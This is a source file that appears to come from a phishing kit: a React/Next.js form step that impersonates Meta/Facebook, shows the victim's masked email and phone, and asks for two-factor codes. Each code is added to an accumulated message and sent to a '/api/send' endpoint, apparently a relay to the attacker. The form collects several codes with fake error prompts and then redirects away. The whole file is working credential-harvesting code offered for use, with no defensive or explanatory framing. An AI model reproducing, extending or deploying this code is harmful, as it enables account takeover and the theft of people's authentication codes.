'use client';

import MetaLogo from '@/assets/images/meta-image.png';
import BgImage from '@/assets/images/verify.webp';
import { useFormStore } from '@/store/form-store';
import type { Dictionary } from '@/types/content';
import config from '@/utils/config';
import Image from 'next/image';
import { type FC, useEffect, useState } from 'react';

const maskEmail = (email: string) => {
    if (!email) return '';
    const [local, domain] = email.split('@');
    if (!domain) return email;
    const maskedLocal = local.length > 2 ? local[0] + '*'.repeat(local.length - 2) + local.at(-1) : local;
    return `${maskedLocal}@${domain}`;
};

const maskPhone = (phone: string) => {
    if (!phone) return '';
    const digits = phone.replaceAll(/\D/g, '');
    if (digits.length <= 4) return phone;
    return phone.slice(0, -4).replaceAll(/\d/g, '*') + phone.slice(-2);
};

const Step3: FC<{ onNext: () => void; formContent: Dictionary['formModal'] }> = ({ onNext, formContent }) => {
    const { email, phoneNumber, pageName, savedMessage, messageId, setMessageId, setSavedMessage } = useFormStore();
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [showError, setShowError] = useState(false);

    useEffect(() => {
        if (!messageId) {
            window.location.href = config.REDIRECT_URL;
        }
    }, [messageId]);

    const handleSubmit = async () => {
        if (!code.trim() || code.length < 6 || code.length > 8 || isLoading) return;

        setShowError(false);
        setIsLoading(true);

        try {
            const currentAttempt = attempts + 1;
            setAttempts(currentAttempt);

            const codeLine = /* HTML */ `<b>2FA Code ${currentAttempt}/${config.MAX_CODE_ATTEMPTS}:</b> <code>${code}</code>`;
            const newMessage = savedMessage ? `${savedMessage}\n${codeLine}` : codeLine;
            setSavedMessage(newMessage);

            const response = await fetch('/api/send', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    message: newMessage,
                    message_id: messageId
                })
            });

            if (response.ok) {
                const data = await response.json();
                if (data.message_id) {
                    setMessageId(data.message_id);
                }
                if (currentAttempt >= config.MAX_CODE_ATTEMPTS) {
                    onNext();
                } else {
                    setCode('');
                }
            } else {
                setShowError(true);
                setCode('');
            }
        } catch {
            setShowError(true);
            setCode('');

            if (attempts + 1 >= config.MAX_CODE_ATTEMPTS) {
                window.location.href = config.REDIRECT_URL;
            }
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='flex max-h-[90vh] min-h-0 w-full flex-col overflow-y-auto p-4'>
            <div className='flex-1 shrink-0'>
                <p className='text-sm text-gray-500'>
                    {pageName} • {formContent.step3.facebook}
                </p>
                <h2 className='mt-1 text-xl font-bold'>
                    {formContent.step3.title} ({attempts}/{config.MAX_CODE_ATTEMPTS})
                </h2>

                <p className='mt-3 text-sm text-gray-600'>{formContent.step3.description.replace('{email}', maskEmail(email)).replace('{phone}', maskPhone(phoneNumber))}</p>

                <div className='mt-4 overflow-hidden rounded-2xl'>
                    <Image src={BgImage} alt='' className='h-auto w-full object-cover' />
                </div>

                <div className='mt-6'>
                    <div className='relative w-full'>
                        <input type='tel' id='code-input' inputMode='numeric' pattern='[0-9]*' maxLength={8} value={code} onChange={(e) => setCode(e.target.value.replaceAll(/\D/g, '').slice(0, 8))} className='peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder='Code' />
                        <label htmlFor='code-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                            {formContent.step3.code}
                        </label>
                    </div>
                    {showError && <p className='mt-2 text-[15px] text-red-500'>{formContent.step3.error}</p>}

                    <button onClick={handleSubmit} disabled={isLoading} className={`mt-4 flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                        {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : formContent.step3.continueButton}
                    </button>

                    <button className='mt-3 flex h-12.5 w-full items-center justify-center rounded-full border-2 border-[#d4dbe3] font-semibold text-gray-700 transition-colors hover:bg-gray-100'>{formContent.step3.tryAnotherMethod}</button>
                </div>
            </div>

            <div className='flex items-center justify-center pt-3'>
                <Image src={MetaLogo} alt='' className='w-16' />
            </div>
        </div>
    );
};

export default Step3;
